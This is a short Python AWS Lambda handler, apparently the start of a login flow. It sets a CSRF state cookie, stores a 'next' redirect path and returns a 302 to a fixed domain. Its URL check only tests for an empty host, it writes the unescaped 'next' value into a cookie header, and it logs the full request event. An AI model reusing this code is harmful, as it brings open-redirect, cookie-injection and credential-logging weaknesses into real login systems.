import json
import os
from urllib.parse import urlparse

def is_safe_url(url):
  if urlparse(url).netloc!= '':
    return False
  else: return True

def random_hex_bytes(n_bytes):
  """Create a hex encoded string of random bytes"""
  return os.urandom(n_bytes).hex()

def lambda_handler(event, context):
    print(str(event))
    cookie = {}
    #create a csrf state to prevent csrf login
    cookie['csrf_state'] = random_hex_bytes(8)
    if 'queryStringParameters' in event:
        if 'next' in event['queryStringParameters']:
          next_page = event['queryStringParameters']['next']
          if next_page and is_safe_url(next_page): 
            cookie['next']=next_page
    return {
           "cookies" : [f"{key}={cookie[key]}; Path=/; Secure; HttpOnly" for key in cookie.keys()],
          "isBase64Encoded": False,
          "statusCode": 302,
          "headers": {
               "Location": "https://issse31ptdmss.xyz/"
          },
          "body": ""
     }